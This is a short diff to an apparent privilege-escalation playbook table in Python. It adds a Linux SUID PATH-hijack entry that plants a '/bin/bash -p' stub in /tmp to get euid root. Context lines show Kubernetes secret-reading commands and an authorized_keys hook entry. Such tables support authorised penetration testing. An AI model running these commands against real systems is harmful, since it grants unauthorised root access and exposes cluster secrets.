@@ -200,6 +200,15 @@ _PLAYS = [
             "auth can-i --list   (or KUBECONFIG=<file> kubectl get secrets -A)",
      "prereq": "a readable service-account token or kubeconfig",
      "validate": "authorised cluster API actions (read secrets / exec pods)"},
+    {"id": "lin-suid-pathhijack", "os": "linux",
+     "match": r"suid path-hijack",
+     "extract": r"\[([a-z0-9 -]+)\]",
+     "tool": "built-in shell (PATH hijack)",
+     "cmd": "for one of [{X}]: echo '/bin/bash -p' >/tmp/<cmd>; chmod +x /tmp/<cmd>; "
+            "PATH=/tmp:$PATH <suid-bin>",
+     "prereq": "a custom SUID binary that invokes a command by bare name (found by "
+               "the static analysis)",
+     "validate": "id -> euid=0(root)"},
     {"id": "lin-writable-hook", "os": "linux",
      "match": r"writable login-time|writable ~/.ssh/authorized_keys",
      "extract": r"(/\S+|~/\S+)",
